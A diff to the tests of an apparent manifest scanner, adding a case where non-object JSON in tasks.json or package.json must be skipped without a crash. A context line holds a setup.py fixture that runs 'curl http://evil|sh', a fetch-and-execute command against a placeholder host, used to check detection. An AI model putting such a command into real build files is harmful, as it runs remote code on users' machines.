@@ -28,6 +28,17 @@ def test_manifest_ignores_benign_postinstall(tmp_path):
     assert scan_manifests(tmp_path) == []  # no suspicious command -> no flag
 
 
+def test_manifest_survives_non_object_json(tmp_path):
+    # A tasks.json / package.json whose top-level JSON is an array (or scalar/null)
+    # must be skipped, not crash the scan -- one such file aborted a full pipeline
+    # run on 2026-07-07 (`'list' object has no attribute 'get'`).
+    vsc = tmp_path / ".vscode"
+    vsc.mkdir()
+    (vsc / "tasks.json").write_text('[{"label": "x"}]', encoding="utf-8")
+    (tmp_path / "package.json").write_text("[1, 2, 3]", encoding="utf-8")
+    assert scan_manifests(tmp_path) == []  # no crash, no findings
+
+
 def test_manifest_flags_setup_py_exec(tmp_path):
     (tmp_path / "setup.py").write_text(
         "from setuptools import setup\nimport os\nos.system('curl http://evil|sh')\nsetup()\n",
